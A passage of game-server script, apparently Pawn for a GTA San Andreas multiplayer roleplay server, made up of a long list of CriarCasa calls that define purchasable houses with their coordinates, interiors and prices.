	CriarCasa(72, -2438.332519, 1141.016845, 55.726562, 2283.3472,-1139.6055,1050.8984, 11, 90000, 80000, 72, 172);
	CriarCasa(73, -2493.354248, 1141.977539, 55.726562, 2233.6101, -1114.2667, 1050.8828, 5, 90000, 80000, 73, 173);
	CriarCasa(74, -2549.073730, 1145.729858, 55.726562, 223.0062, 1287.1655, 1082.1406, 1, 90000, 80000, 74, 174);
	CriarCasa(75, -2477.246826, 1244.466430, 33.609375, 266.8205, 305.0191, 999.1484, 2, 50000, 40000, 75, 175);
	CriarCasa(76, -2383.140136, 1336.411010, 12.806699, 2309.0664, -1212.7429, 1049.0234, 6, 60000, 50000, 76, 176);
	CriarCasa(77, -2905.104980, 1178.854248, 13.664062, 2283.3472,-1139.6055,1050.8984, 11, 65000, 55000, 77, 177);
	CriarCasa(78, -2845.313720, 928.400390, 44.054687, 2233.6101, -1114.2667, 1050.8828, 5, 65000, 55000, 78, 178);
	CriarCasa(79, -2864.938476, 681.408081, 23.460033, 223.0062, 1287.1655, 1082.1406, 1, 70000, 60000, 79, 179);
	CriarCasa(80, -2710.706298, 967.470764, 54.460937, 295.7500,1474.5068,1080.2578, 15, 90000, 80000, 80, 180);
	CriarCasa(81, -2655.336669, 985.787780, 64.991287, 2267.3247, -1210.0126, 1048.2891, 10, 90000, 80000, 81, 181);
	CriarCasa(82, -2641.083251, 935.720275, 71.953125, 23.6655,1340.8721,1084.3750, 10, 70000, 60000, 82, 182);
	CriarCasa(83, -2662.119628, 876.332946, 79.773796, 2195.6973,-1204.0471,1049.0234, 6, 150000, 140000, 83, 183);
	CriarCasa(84, -2720.863525, 923.924316, 67.593750, 260.6836,1238.0439,1084.2578, 9, 100000, 90000, 84, 184);
	CriarCasa(85, -2706.658203, 864.452758, 70.703125, 295.7500,1474.5068,1080.2578, 15, 80000, 70000, 85, 185);
	CriarCasa(86, -2700.344482, 820.864379, 49.984375, 2309.0664, -1212.7429, 1049.0234, 6, 85000, 75000, 86, 186);
	CriarCasa(87, -2731.552978, 723.701904, 41.273437, -42.3936, 1406.0759, 1084.4297, 8, 55000, 45000, 87, 188);
	CriarCasa(88, -2625.480957, 733.115966, 28.010654, 266.8205, 305.0191, 999.1484, 2, 50000, 40000, 88, 189);
	CriarCasa(89, -2621.676025, 802.908203, 49.984375, 2233.6101, -1114.2667, 1050.8828, 5, 45000, 35000, 89, 190);
	CriarCasa(90, -2620.233154, 883.202697, 63.250000, 2283.3472,-1139.6055,1050.8984, 11, 45000, 35000, 90, 191);
	CriarCasa(91, -2791.599121, 218.618942, 7.859375, 225.4087, 1240.1775, 1082.1406, 2, 60000, 50000, 91, 192);
	CriarCasa(92, -2789.188720, 183.693084, 10.062500, 260.6836,1238.0439,1084.2578, 9, 60000, 60000, 92, 193);
	CriarCasa(93, -2790.246337, 69.721672, 7.201953, -42.3936, 1406.0759, 1084.4297, 8, 65000, 55000, 93, 194);
	CriarCasa(94, -2789.176757, -181.379821, 10.062500, 223.0062, 1287.1655, 1082.1406, 1, 65000, 55000, 94, 195);
	CriarCasa(95, -2720.905517, -320.711639, 7.843750, 140.6904,1367.2458,1083.8594, 5, 5000000, 4000000, 95, 196);
	CriarCasa(96, 699.6743, -1059.9338, 49.4217, 446.9973, 1398.4043, 1084.3120, 2, 150000, 150000, 96, 197);
	CriarCasa(97, -2725.785888, -36.433876, 7.195312, 223.0062, 1287.1655, 1082.1406, 1, 45000, 35000, 97, 198);
	CriarCasa(98, -2686.804199, 115.496765, 7.195312, 2283.3472,-1139.6055,1050.8984, 11, 45000, 35000, 98, 199);
	CriarCasa(99, -2630.925781, 252.858963, 7.187500, 22.9850, 1404.0869, 1084.4297, 5, 45000, 35000, 100, 100);
	CriarCasa(100, -2454.593505, -135.861633, 26.190830, 2267.3247, -1210.0126, 1048.2891, 10, 100000, 90000, 101, 201);
	CriarCasa(101, -2213.650634, 720.787231, 49.406250, 2309.0664, -1212.7429, 1049.0234, 6, 60000, 50000, 102, 202);
	CriarCasa(102, -2099.626220, 897.367736, 76.710937, 2195.6973,-1204.0471,1049.0234, 6, 150000, 140000, 103, 203);
	CriarCasa(103, -2152.507080, 1232.806884, 33.929687, -42.3936, 1406.0759, 1084.4297, 8, 65000, 55000, 104, 204);
	CriarCasa(104, -1970.510253, 1272.978759, 7.604368, 260.6836,1238.0439,1084.2578, 9, 85000, 75000, 105, 205);
	CriarCasa(105, -1872.068847, 1125.387451, 45.445312, 295.7500,1474.5068,1080.2578, 15, 40000, 30000, 106, 206);
	CriarCasa(106, -1872.070678, 1146.665161, 45.445312, 295.7500,1474.5068,1080.2578, 15, 45000, 35000, 107, 207);
	CriarCasa(107, 1106.544311, -299.730895, 74.539062, 260.6836,1238.0439,1084.2578, 9, 90000, 80000, 108, 208);
	CriarCasa(108, -2048.103271, 786.778564, 64.156250, 2267.3247, -1210.0126, 1048.2891, 10, 70000, 60000, 109, 209);
	CriarCasa(109, -2048.256103, 755.408935, 64.156250, 2267.3247, -1210.0126, 1048.2891, 10, 70000, 60000, 110, 210);
	CriarCasa(110, 1273.954711, 2522.520263, 10.820312, 2318.0107, -1026.4070, 1050.2178, 9, 200000, 190000, 111, 211);
	CriarCasa(111, 1453.953735, 2525.618652, 10.820312, 235.6503,1187.1404,1080.2578, 3, 150000, 140000, 112, 212);
	CriarCasa(112, 1500.817871, 2535.346435, 10.820312, 235.6503,1187.1404,1080.2578, 3, 140000, 130000, 113, 213);
	CriarCasa(113, 1456.134277, 2773.405029, 10.820312, 234.4912, 1065.4930, 1084.2097, 6, 6000000, 5000000, 114, 214);
	CriarCasa(114, 1575.742187, 2844.162353, 10.820312, 23.6655,1340.8721,1084.3750, 10, 150000, 140000, 115, 215);
	CriarCasa(115, 1678.483154, 2690.762207, 10.820312, 23.6655,1340.8721,1084.3750, 10, 190000, 180000, 116, 216);
	CriarCasa(116, 1929.851318, 2774.273681, 10.820312, 2324.3579, -1148.9768, 1050.7101, 12, 150000, 140000, 117, 217);
	CriarCasa(117, 2109.235839, 2652.891357, 10.812969, -42.3936, 1406.0759, 1084.4297, 8, 60000, 50000, 118, 218);
	CriarCasa(118, 985.478881, 2314.190185, 11.460937, 2365.1567, -1134.5105, 1050.8750, 8, 100000, 90000, 119, 219);
	CriarCasa(119, 986.432678, 2271.251953, 11.460937, 376.5438, 1417.5194, 1081.3281, 15, 100000, 90000, 120, 220);
	CriarCasa(120, 1030.807495, 2028.140136, 11.468292, 387.1854, 1471.9427, 1080.1875, 15, 90000, 80000, 122, 222);
	CriarCasa(121, 983.971679, 1978.313232, 11.468292, 22.9850, 1404.0869, 1084.4297, 5, 80000, 70000, 123, 223);
	CriarCasa(122, 929.063293, 2006.415405, 11.460937, 295.7500,1474.5068,1080.2578, 15, 100000, 90000, 124, 224);
	CriarCasa(123, 930.808471, 2027.918579, 11.468292, 2237.6770,-1080.4869,1049.0234, 2, 90000, 80000, 125, 225);
	CriarCasa(124, 1029.359375, 1905.890625, 11.460937, -68.63, 1351.83, 1080.21, 6, 95000, 85000, 126, 226);
	CriarCasa(125, 1319.304931, 2005.724487, 11.460937, 260.6836,1238.0439,1084.2578, 9, 90000, 80000, 127, 227);
	CriarCasa(126, 1309.257690, 1931.248535, 11.460937, -42.3936, 1406.0759, 1084.4297, 8, 90000, 80000, 128, 228);
	CriarCasa(127, 1365.413330, 1974.180541, 11.460937, 328.0467, 1478.5269, 1084.4375, 15, 80000, 70000, 129, 229);
	CriarCasa(128, 1408.277832, 1897.031738, 11.460937, 2365.1567, -1134.5105, 1050.8750, 8, 110000, 100000, 130, 230);
	CriarCasa(129, 1464.494750, 1895.143188, 11.460937, 387.1854, 1471.9427, 1080.1875, 15, 110000, 100000, 131, 231);
	CriarCasa(130, 1439.752441, 1951.253173, 11.460937, 225.4087, 1240.1775, 1082.1406, 2, 95000, 85000, 132, 232);
	CriarCasa(131, 1542.457641, 1996.354492, 14.739588, 223.0062, 1287.1655, 1082.1406, 1, 80000, 70000, 133, 233);
	CriarCasa(132, 263.5550, 2895.4639, 10.5314, 271.884979, 306.631988, 999.148437, 2, 20000, 20000, 134, 234);
	// New Casas
	CriarCasa(156, 893.639160, -1637.187622, 14.929687, 2365.1567, -1134.5105, 1050.8750, 8, 110000, 110000, 160, 474);
	CriarCasa(157, 865.378417, -1635.407592, 14.929687, 22.9850, 1404.0869, 1084.4297, 5, 100000, 100000, 161, 477);
	CriarCasa(158, 847.953674, -1717.377807, 14.929687, 22.9850, 1404.0869, 1084.4297, 5, 100000, 100000, 161, 477);
	CriarCasa(159, 768.435852, -1696.560913, 5.155420, 266.8205, 305.0191, 999.1484, 2, 90000, 90000, 161, 477);
	CriarCasa(160, 315.850738, -1770.818481, 4.675946, -261.0245,1456.4869,1084.3672, 4, 150000, 150000, 162, 480);
	CriarCasa(161, 1326.313720, -1090.653930, 27.976562, 328.0467, 1478.5269, 1084.4375, 15, 110000, 110000, 163, 483);
	CriarCasa(162, 280.958984, -1768.304931, 4.527257, 2365.1567, -1134.5105, 1050.8750, 8, 10000, 10000, 164, 486);
	CriarCasa(163, 295.316589, -1765.412963, 4.546563, 344.3439, 304.6621, 999.1484, 6, 90000, 90000, 165, 489);
	CriarCasa(165, 725.584106, -1450.463134, 17.695312, 295.7500,1474.5068,1080.2578, 15, 200000, 200000, 167, 495);
	CriarCasa(166, 766.517456, -1605.870971, 13.803857, -42.3936, 1406.0759, 1084.4297, 8, 100000, 100000, 168, 498);
	CriarCasa(170, 2045.425170, -1116.123657, 26.361747, 223.0062, 1287.1655, 1082.1406, 1, 90000, 90000, 172, 510);
	CriarCasa(171, 2104.922607, -1056.952880, 27.128387, 422.2346, 2536.7002, 10.0000, 10, 90000, 90000, 173, 513);
	CriarCasa(172, 2092.093505, -1067.542358, 27.624706, 266.8205, 305.0191, 999.1484, 2, 80000, 80000, 174, 516);
	CriarCasa(175, 2186.391845, -997.819946, 66.468750, 2283.3472,-1139.6055,1050.8984, 11, 110000, 110000, 177, 525);
	CriarCasa(176, 2260.054931, -1019.681213, 59.292358, 243.7343, 305.1178, 999.1484, 1, 120000, 120000, 178, 528);
	CriarCasa(177, 2090.899414, -972.821289, 51.919330, 344.3439, 304.6621, 999.1484, 6, 110000, 110000, 179, 531);
	CriarCasa(178, 2050.449462, -954.701293, 48.034595, 2283.3472,-1139.6055,1050.8984, 11, 100000, 100000, 180, 534);
	CriarCasa(179, 2140.082519, -1007.612731, 61.738796, 422.2346, 2536.7002, 10.0000, 10, 90000, 90000, 181, 537);
	CriarCasa(180, 2219.302734, -1031.028442, 59.928134, 422.2346, 2536.7002, 10.0000, 10, 90000, 90000, 182, 540);
	CriarCasa(181, 2283.890136, -1046.567504, 49.887119, 2233.6101, -1114.2667, 1050.8828, 5, 80000, 80000, 183, 543);
	CriarCasa(182, 2457.038085, -1101.867431, 43.867187, -42.3936, 1406.0759, 1084.4297, 8, 80000, 80000, 184, 546);
	CriarCasa(183, 2519.518310, -1112.960693, 56.592597, 2309.0664, -1212.7429, 1049.0234, 6, 80000, 80000, 185, 549);
	CriarCasa(184, 2571.983398, -1091.349121, 67.225723, -68.63, 1351.83, 1080.21, 6, 100000, 100000, 186, 552);
	CriarCasa(185, 2756.289062, -1182.147216, 69.398910, 376.5438, 1417.5194, 1081.3281, 15, 120000, 120000, 187, 555);
	CriarCasa(190, 2801.430908, -1105.274414, 30.719810, -261.0245,1456.4869,1084.3672, 4, 90000, 90000, 192, 570);
	CriarCasa(191, 2801.336914, -1070.434692, 30.630123, -261.0245,1456.4869,1084.3672, 4, 90000, 90000, 193, 573);
	CriarCasa(192, 2793.777343, -1087.522827, 30.718750, 140.6904,1367.2458,1083.8594, 5, 200000, 200000, 194, 576);
	CriarCasa(193, 2637.785156, -1992.366210, 13.993547, 223.0062, 1287.1655, 1082.1406, 1, 80000, 80000, 195, 579);
	CriarCasa(194, 2695.256103, -2020.060180, 14.022284, -68.63, 1351.83, 1080.21, 6, 85000, 85000, 196, 582);
	CriarCasa(200, 2409.012451, -1673.364013, 13.598647, 223.0062, 1287.1655, 1082.1406, 1, 90000, 90000, 202, 600);
	CriarCasa(201, -2027.774780, -41.336177, 38.804687, 2309.0664, -1212.7429, 1049.0234, 6, 55000, 55000, 203, 603);
	CriarCasa(202, -2511.479003, 942.798706, 65.289062, 2283.3472,-1139.6055,1050.8984, 11, 50000, 50000, 204, 606);
	CriarCasa(203, -2552.041992, 2266.523193, 5.475524, 295.7500,1474.5068,1080.2578, 15, 85000, 85000, 205, 609);
	CriarCasa(204, -2059.075927, 890.156127, 61.853214, 22.9850, 1404.0869, 1084.4297, 5, 65000, 65000, 206, 612);
	CriarCasa(205, -2689.015380, 198.373107, 7.203125, 223.0062, 1287.1655, 1082.1406, 1, 68000, 68000, 207, 615);
	CriarCasa(206, -2687.435546, -188.129776, 7.203125, -68.63, 1351.83, 1080.21, 6, 63000, 63000, 208, 618);
	CriarCasa(207, -2622.882812, -99.349082, 7.203125, 223.0062, 1287.1655, 1082.1406, 1, 65000, 65000, 209, 621);
	CriarCasa(208, -2386.561279, 2446.765380, 10.169355, 235.6503,1187.1404,1080.2578, 3, 180000, 180000, 210, 624);
	CriarCasa(209, -2597.888427, 2357.067871, 9.882995, -261.0245,1456.4869,1084.3672, 4, 175000, 175000, 210, 626);
	CriarCasa(210, -2523.596435, 2239.458740, 5.398399, -68.63, 1351.83, 1080.21, 6, 63000, 63000, 212, 630);
	CriarCasa(211, -2582.393554, 2300.270996, 7.002885, 2318.0107, -1026.4070, 1050.2178, 9, 190000, 190000, 213, 633);
	CriarCasa(212, -2627.063964, 2283.357910, 8.310260, 23.6655,1340.8721,1084.3750, 10, 170000, 170000, 214, 636);
	CriarCasa(213, -2636.382324, 2351.317382, 8.506015, 235.6503,1187.1404,1080.2578, 3, 185000, 185000, 215, 639);
	CriarCasa(214, -2632.825195, 2410.610595, 14.023668, 23.6655,1340.8721,1084.3750, 10, 155000, 155000, 216, 642);
	CriarCasa(215, -2472.274169, 2450.952148, 17.323022, -261.0245,1456.4869,1084.3672, 4, 150000, 150000, 217, 645);
	CriarCasa(216, -2424.731201, 2448.580078, 13.155824, 23.6655,1340.8721,1084.3750, 10, 160000, 160000, 218, 648);
	CriarCasa(217, -2398.545166, 2409.135986, 8.910329, -261.0245,1456.4869,1084.3672, 4, 170000, 170000, 219, 651);
	CriarCasa(218, -2437.392333, 2354.649169, 5.443065, 260.6836,1238.0439,1084.2578, 9, 55000, 55000, 220, 654);
	CriarCasa(219, -2058.052490, -2465.255615, 31.179687, 2309.0664, -1212.7429, 1049.0234, 6, 35000, 35000, 221, 657);
	CriarCasa(220, -2161.130126, -2535.214843, 31.816270, -42.3936, 1406.0759, 1084.4297, 8, 60000, 60000, 222, 660);
	CriarCasa(221, -2192.544677, -2510.078125, 31.816272, 225.4087, 1240.1775, 1082.1406, 2, 60000, 60000, 223, 663);
	CriarCasa(222, -2239.034179, -2423.975585, 32.707267, 2333.2029,-1076.5475,1049.0234, 6, 50000, 50000, 224, 666);
	CriarCasa(223, -2075.999511, -2312.472900, 31.131250, 2333.2029,-1076.5475,1049.0234, 6, 65000, 65000, 225, 669);
	CriarCasa(224, -2174.052978, -2481.820800, 31.816272, 2333.2029,-1076.5475,1049.0234, 6, 53000, 53000, 226, 672);
	CriarCasa(225, -2132.262207, -2511.306884, 31.816272, 225.4087, 1240.1775, 1082.1406, 2, 57000, 57000, 227, 675);
	CriarCasa(226, -2199.415527, -2243.162841, 33.320312, 2309.0664, -1212.7429, 1049.0234, 6, 40000, 40000, 228, 678);
	CriarCasa(227, -2180.134033, -2258.507324, 33.320312, 2309.0664, -1212.7429, 1049.0234, 6, 40000, 40000, 229, 681);
	CriarCasa(228, -1533.174438, 2656.643066, 56.281360, 2333.2029,-1076.5475,1049.0234, 6, 54000, 54000, 230, 684);
	CriarCasa(230, -1500.039184, 1960.520019, 49.023437, 223.0062, 1287.1655, 1082.1406, 1, 55000, 55000, 232, 690);
	CriarCasa(231, -1426.852905, 2170.834960, 50.625000, 243.7343, 305.1178, 999.1484, 1, 38000, 38000, 233, 693);
	CriarCasa(232, -314.644470, 1774.510131, 43.640625, 2195.6973,-1204.0471,1049.0234, 6, 140000, 140000, 234, 696);
	CriarCasa(233, -12.484356, 2350.825927, 24.140625, 2283.3472,-1139.6055,1050.8984, 11, 35000, 35000, 235, 699);
	CriarCasa(234, -322.784698, 2675.584228, 63.679687, 260.6836,1238.0439,1084.2578, 9, 60000, 60000, 236, 702);
	CriarCasa(235, -102.192985, 1234.479125, 22.440261, 2233.6101, -1114.2667, 1050.8828, 5, 50000, 50000, 237, 705);
	CriarCasa(236, -77.451690, 1234.440063, 22.440261, 2233.6101, -1114.2667, 1050.8828, 5, 50000, 50000, 238, 708);
	CriarCasa(237, 12.700467, 1113.073730, 20.939867, 387.1854, 1471.9427, 1080.1875, 15, 62000, 62000, 239, 711);
	CriarCasa(238, 1.246908, 1076.138305, 20.939865, 376.5438, 1417.5194, 1081.3281, 15, 63000, 63000, 240, 714);
	CriarCasa(239, -32.238872, 1038.161499, 20.939867, -42.3936, 1406.0759, 1084.4297, 8, 61500, 61500, 241, 717);
	CriarCasa(240, -36.063976, 1115.193237, 20.939863, -68.63, 1351.83, 1080.21, 6, 65000, 65000, 242, 720);
	CriarCasa(241, -258.878479, 1151.084472, 20.939865, 223.0062, 1287.1655, 1082.1406, 1, 66000, 66000, 243, 723);
	CriarCasa(242, -258.771026, 1083.588012, 20.939867, 2333.2029,-1076.5475,1049.0234, 6, 61000, 61000, 244, 726);
	CriarCasa(244, -298.279846, 1115.115112, 20.939865, 2283.3472,-1139.6055,1050.8984, 11, 62500, 62500, 246, 732);
	CriarCasa(245, -362.073028, 1110.587890, 20.939865, 223.0062, 1287.1655, 1082.1406, 1, 65500, 65500, 247, 735);
	CriarCasa(246, -369.471771, 1169.205566, 20.271875, 2267.3247, -1210.0126, 1048.2891, 10, 77000, 77000, 248, 738);
	CriarCasa(247, 294.986419, -54.950302, 2.777210, 387.1854, 1471.9427, 1080.1875, 15, 75000, 75000, 249, 741);
	CriarCasa(248, 313.438262, -92.284751, 3.535393, 295.7500,1474.5068,1080.2578, 15, 79000, 79000, 250, 744);
	CriarCasa(249, 313.248474, -121.320854, 3.535394, -42.3936, 1406.0759, 1084.4297, 8, 77500, 77500, 251, 747);
	CriarCasa(250, 252.386215, -92.396453, 3.535394, -68.63, 1351.83, 1080.21, 6, 76500, 76500, 252, 750);
	CriarCasa(251, 252.484497, -121.196304, 3.535393, 2283.3472,-1139.6055,1050.8984, 11, 74500, 74500, 253, 753);
	CriarCasa(252, 2550.897216, 57.234905, 27.675645, 295.7500,1474.5068,1080.2578, 15, 80000, 80000, 254, 756);
	CriarCasa(253, 2479.3501, 94.6164, 27.6835, 295.7500,1474.5068,1080.2578, 15, 82000, 82000, 255, 759);
	CriarCasa(254, 2443.318847, 61.331012, 28.441642, 387.1854, 1471.9427, 1080.1875, 15, 77000, 77000, 256, 762);
	CriarCasa(255, 2484.448486, -28.047594, 28.441642, -68.63, 1351.83, 1080.21, 6, 75000, 75000, 257, 765);
	CriarCasa(256, 2548.772216, 25.203191, 27.675647, 295.7500,1474.5068,1080.2578, 15, 81000, 81000, 258, 768);
	CriarCasa(257, 2415.537353, -51.621799, 28.153547, 2333.2029,-1076.5475,1049.0234, 6, 74000, 74000, 259, 771);
	CriarCasa(258, 2367.343994, -48.657531, 28.153547, -68.63, 1351.83, 1080.21, 6, 76000, 76000, 260, 774);
	CriarCasa(259, 2374.631835, 71.126762, 28.441642, 2283.3472,-1139.6055,1050.8984, 11, 75500, 75500, 261, 777);
	CriarCasa(260, 2374.504150, -8.704338, 28.441642, 223.0062, 1287.1655, 1082.1406, 1, 76500, 76500, 262, 780);
	CriarCasa(261, 2293.746337, -124.591171, 28.153549, 2333.2029,-1076.5475,1049.0234, 6, 69000, 69000, 263, 783);
	CriarCasa(262, 2245.462646, -121.566802, 28.153547, -42.3936, 1406.0759, 1084.4297, 8, 70000, 70000, 264, 786);
	CriarCasa(263, 2203.519287, -89.292785, 28.153547, 2309.0664, -1212.7429, 1049.0234, 6, 68000, 68000, 265, 789);
	CriarCasa(264, 2245.399658, -2.166630, 28.153551, 2309.0664, -1212.7429, 1049.0234, 6, 68100, 68100, 266, 792);
	CriarCasa(265, 2324.527832, 191.092453, 28.441642, 2283.3472,-1139.6055,1050.8984, 11, 66500, 66500, 267, 795);
	CriarCasa(266, 2363.270751, 116.155487, 28.441644, 223.0062, 1287.1655, 1082.1406, 1, 67500, 67500, 268, 798);
	CriarCasa(267, 2236.477294, 167.787551, 28.153549, 2283.3472,-1139.6055,1050.8984, 11, 67000, 67000, 269, 801);
	CriarCasa(268, 2285.895751, 161.123901, 28.441642, 2283.3472,-1139.6055,1050.8984, 11, 65000, 65000, 270, 804);
	CriarCasa(269, 2204.764648, 62.253032, 28.441644, 2309.0664, -1212.7429, 1049.0234, 6, 64000, 64000, 271, 807);
	CriarCasa(270, 818.179626, -509.859497, 18.012922, 2283.3472,-1139.6055,1050.8984, 11, 70000, 70000, 272, 810);
	CriarCasa(271, 768.233947, -504.002655, 18.012926, 223.0062, 1287.1655, 1082.1406, 1, 75000, 75000, 273, 813);
	CriarCasa(272, 795.175170, -507.019897, 18.012922, 223.0062, 1287.1655, 1082.1406, 1, 79000, 79000, 274, 816);
	CriarCasa(273, 745.154541, -556.204772, 18.012926, 2283.3472,-1139.6055,1050.8984, 11, 72000, 72000, 275, 819);
	CriarCasa(274, 228.433258, -1404.735229, 51.609375, 295.7500,1474.5068,1080.2578, 15, 110000, 110000, 276, 822);
	CriarCasa(275, 219.656082, -1250.206909, 78.333290, 2324.3579, -1148.9768, 1050.7101, 12, 200000, 200000, 277, 825);
	CriarCasa(276, 977.319824, -770.868835, 112.202629, 2324.3579, -1148.9768, 1050.7101, 12, 189000, 189000, 278, 828);
	CriarCasa(277, 808.810058, -759.292053, 76.531364, 295.7500,1474.5068,1080.2578, 15, 120000, 120000, 279, 831);
	CriarCasa(278, 416.458892, -1154.410034, 76.687614, 295.7500,1474.5068,1080.2578, 15, 120000, 120000, 280, 834);
	CriarCasa(279, 558.641357, -1075.706665, 72.921989, 295.7500,1474.5068,1080.2578, 15, 120000, 120000, 281, 837);
    CriarCasa(280, 2495.3457, -1690.2333, 14.7656, 2496.0549, -1695.1749, 1014.7422, 3, 100000, 100000,0,100);
	CriarCasa(281, 431.917968, -1253.568603, 51.580940, 2237.6770,-1080.4869,1049.0234, 2, 180000, 180000, 254, 756);
	CriarCasa(287, 730.882202, -1013.599182, 52.737854, 260.6836,1238.0439,1084.2578, 9, 190000, 190000, 260, 774);
	CriarCasa(289, 827.971252, -858.642089, 70.330810, 376.5438, 1417.5194, 1081.3281, 15, 180000, 180000, 262, 780);
	CriarCasa(290, 836.378356, -894.059631, 68.768898, 234.4912, 1065.4930, 1084.2097, 6, 250000, 250000, 263, 783);
	CriarCasa(298, 1242.578979, -1076.549438, 31.554687, 447.3509,1397.9342,1084.3047, 2, 150000, 150000, 271, 807);
	CriarCasa(299, 1183.166503, -1076.158447, 31.678918, 235.6503,1187.1404,1080.2578, 3, 160000, 160000, 272, 810);
	CriarCasa(301, 423.708740, 2536.581054, 16.148437, 243.7343, 305.1178, 999.1484, 1, 80000, 80000, 303, 903);
	CriarCasa(302, -254.704086, 2603.216064, 62.858154, 227.2102, 1114.0662, 1080.9976, 5, 350000, 350000, 304, 906);
	CriarCasa(303, -208.132644, 2712.909179, 62.979370, 422.2346, 2536.7002, 10.0000, 10, 35000, 35000, 305, 909);
	CriarCasa(304, -232.912322, 2807.542968, 62.054687, 422.2346, 2536.7002, 10.0000, 10, 25000, 25000, 306, 912);
	CriarCasa(306, -362.244079, 2222.264648, 43.007812, 2333.2029,-1076.5475,1049.0234, 6, 20000, 20000, 308, 918);
	CriarCasa(307, -431.072906, 2240.711425, 42.983383, -42.3936, 1406.0759, 1084.4297, 8, 22000, 22000, 309, 921);
	CriarCasa(308, -1390.018554, 2638.048583, 55.984375, 2333.2029,-1076.5475,1049.0234, 6, 25000, 25000, 310, 924);
	CriarCasa(309, -1051.527343, 1549.818725, 33.437610, 2333.2029,-1076.5475,1049.0234, 6, 25000, 25000, 311, 927);
	CriarCasa(310, -746.166687, 1590.162109, 26.975921, 266.8205, 305.0191, 999.1484, 2, 30000, 30000, 312, 930);
	CriarCasa(311, -795.678405, 1557.046020, 27.124444, 344.3439, 304.6621, 999.1484, 6, 28000, 28000, 313, 933);
	CriarCasa(312, -773.805786, 1425.845825, 13.945312, 266.8205, 305.0191, 999.1484, 2, 20000, 20000, 314, 936);
	CriarCasa(314, 2238.006835, 1285.748779, 10.820312, 140.6904,1367.2458,1083.8594, 5, 400000, 400000, 316, 942);
	CriarCasa(315, 2186.077148, 1113.818969, 12.648437, 225.6608, 1021.8754, 1084.0165, 7, 400000, 400000, 317, 945);
	CriarCasa(316, 1374.702880, 475.196289, 20.053573, 422.2346, 2536.7002, 10.0000, 10, 25000, 25000, 318, 948);
	CriarCasa(317, 870.177734, -25.506868, 63.943473, 221.8483, 1140.6533, 1082.6094, 4, 80000, 80000, 319, 951);
	CriarCasa(318, -381.753784, -1438.930053, 25.726562, 140.6904,1367.2458,1083.8594, 5, 200000, 200000, 320, 954);
	CriarCasa(319, -283.303649, -2174.710205, 28.666320, 260.6836,1238.0439,1084.2578, 9, 190000, 190000, 321, 957);
	CriarCasa(320, -607.461181, -1074.881591, 23.518177, 422.2346, 2536.7002, 10.0000, 10, 25000, 25000, 322, 960);
	CriarCasa(321, -601.159545, -1065.905029, 23.406784, 243.7343, 305.1178, 999.1484, 1, 25000, 25000, 323, 963);
	CriarCasa(322, -594.730285, -1057.355102, 23.357742, 422.2346, 2536.7002, 10.0000, 10, 25000, 25000, 324, 966);
	CriarCasa(323, -588.549865, -1049.303466, 23.349040, 243.7343, 305.1178, 999.1484, 1, 25000, 25000, 325, 969);
	CriarCasa(324, -582.584533, -1040.734008, 23.594219, 422.2346, 2536.7002, 10.0000, 10, 25000, 25000, 326, 972);
	CriarCasa(325, -576.570190, -1032.448486, 23.817081, 243.7343, 305.1178, 999.1484, 1, 25000, 25000, 327, 975);
	CriarCasa(326, -347.909973, -1046.598144, 59.812500, 223.0062, 1287.1655, 1082.1406, 1, 100000, 100000, 328, 978);
	CriarCasa(327, -491.537445, -193.745880, 78.345634, 422.2346, 2536.7002, 10.0000, 10, 60000, 60000, 329, 981);
	CriarCasa(328, 2351.967285, -1169.586914, 28.022224, 295.7500,1474.5068,1080.2578, 15, 150000, 150000, 330, 984);
	CriarCasa(329, 2382.882568, -1366.293701, 24.491352, -42.3936, 1406.0759, 1084.4297, 8, 80000, 80000, 331, 987);
	CriarCasa(330, 2153.657470, -1242.888671, 25.367187, 2365.1567, -1134.5105, 1050.8750, 8, 100000, 100000, 332, 990);
	CriarCasa(334, 2100.861328, -1321.039184, 25.953125, 22.9850, 1404.0869, 1084.4297, 5, 80000, 80000, 336, 1002);
	CriarCasa(335, 2126.705322, -1319.908081, 26.624101, 23.6655,1340.8721,1084.3750, 10, 120000, 120000, 337, 1005);
	CriarCasa(336, 2132.284667, -1280.719360, 25.890625, 223.0062, 1287.1655, 1082.1406, 1, 90000, 90000, 338, 1008);
	CriarCasa(337, 2148.491210, -1319.070434, 25.743345, 2283.3472,-1139.6055,1050.8984, 11, 90000, 90000, 339, 1011);
	CriarCasa(338, 2191.521972, -1276.447387, 25.156250, 422.2346, 2536.7002, 10.0000, 10, 60000, 60000, 340, 1014);
	CriarCasa(339, 2250.281738, -1280.986206, 25.476562, -42.3936, 1406.0759, 1084.4297, 8, 70000, 70000, 341, 1017);
	CriarCasa(340, 2256.489501, -1395.528808, 24.000000, 2333.2029,-1076.5475,1049.0234, 6, 50000, 50000, 342, 1020);
	CriarCasa(341, 2191.358886, -1470.371459, 25.914062, 243.7343, 305.1178, 999.1484, 1, 50000, 50000, 343, 1023);
	CriarCasa(342, 2149.864501, -1419.042846, 25.921875, 223.0062, 1287.1655, 1082.1406, 1, 70000, 70000, 344, 1026);
	CriarCasa(343, 1468.692871, -905.167297, 54.835937, 260.6836,1238.0439,1084.2578, 9, 100000, 100000, 345, 1029);
	CriarCasa(345, 1539.977050, -851.510742, 64.336059, 235.6503,1187.1404,1080.2578, 3, 120000, 120000, 347, 1035);
	CriarCasa(347, 989.746826, -828.423828, 95.468574, 376.5438, 1417.5194, 1081.3281, 15, 110000, 110000, 349, 1041);
	CriarCasa(349, 2014.450073, -1732.512451, 14.235466, 223.0062, 1287.1655, 1082.1406, 1, 100000, 100000, 351, 1047);
	CriarCasa(351, 692.8987, -1602.7727, 15.0469, 23.6655, 1340.8721, 1084.3750, 10, 150000, 150000, 353, 1053);
	CriarCasa(352, 2147.5879, -1367.0447, 25.6418, 2283.3472,-1139.6055,1050.8984, 11, 110000, 110000, 354, 1054);
    CriarCasa(353, 937.3655, -847.6946, 93.7398, -68.5478, 1353.0201, 1080.2109, 6, 150000, 150000, 355, 1056);
    CriarCasa(355, 2027.5443,1917.5222,12.3373, 2216.1282, -1076.3052, 1050.4844, 1, 150000, 150000, 357, 1066);
    CriarCasa(356, 993.7194,-1057.6760,33.7031, 2324.3579, -1148.9768, 1050.7101, 12, 170000, 170000, 359, 1067);
    //
    CriarCasa(357, 2469.5115, -3482.5698, 7.7656, 177.7667, 1471.9427, 1080.1875, 15, 500000, 500000, 359, 1071);
	CriarCasa(358, 2461.4299, -3489.0608, 7.7656, 158.9665,1340.8721,1084.3750, 10, 500000, 500000, 360, 1074);
	CriarCasa(359, 2453.1912, -3496.1555, 7.7656, 155.8331,1474.5068,1080.2578, 15, 500000, 5000000, 361, 1077);
